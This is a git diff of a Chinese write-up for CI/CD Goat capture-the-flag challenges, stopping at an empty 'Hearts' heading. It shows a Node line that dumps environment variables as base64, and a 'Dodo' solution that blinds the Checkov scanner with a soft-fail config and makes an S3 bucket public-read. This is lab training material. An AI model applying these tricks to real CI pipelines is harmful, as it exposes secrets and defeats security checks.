@@ -274,9 +274,18 @@ child_process.exec('env|base64 -w 0',function(error, stdout, stderr){console.log
   },
 ```
 
-它是通过字下载twiddledee版本发布中的1.1.0来更新的。因此把之前1.1.0的版本发布和tag删除后重新发布：
+它是通过字下载twiddledee的tag为1.1.0的源码来更新的。因此把之前1.1.0的版本发布和tag删除后重新发布：
 
 ![image-20231106185115442](README.assets/image-20231106185115442.png)
+
+
+
+或者push的时候就打上tag：
+
+```bash
+git tag 1.2.0 HEAD
+git push origin 1.2.0
+```
 
 
 
@@ -286,7 +295,32 @@ twiddledum那里再build就可以得到flag：
 
 
 
+## Dodo
+
+参考https://www.cidersecurity.io/blog/research/malicious-code-analysis-abusing-sast-misconfigurations-to-hack-ci-systems/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422，利用配置文件来控制SAST扫描器的行为。
+
+创建一个`.checkov.yml`：
+
+```yaml
+soft-fail: true
+check:
+  - THIS_NOT_THE_CHECK_YOUR_ARE_LOOKING_FOR
+```
 
 
 
+修改main.tf中的bucket acl为public-read
+
+```tf
+resource "aws_s3_bucket" "dodo" {
+   bucket        = var.bucket_name
+   acl           = "public-read"
+
+```
+
+push之后build就可以绕过检测得到flag。我这边环境有问题，checkov那一步会稳定报一个错，就没有办法。
+
+
+
+## Hearts
 
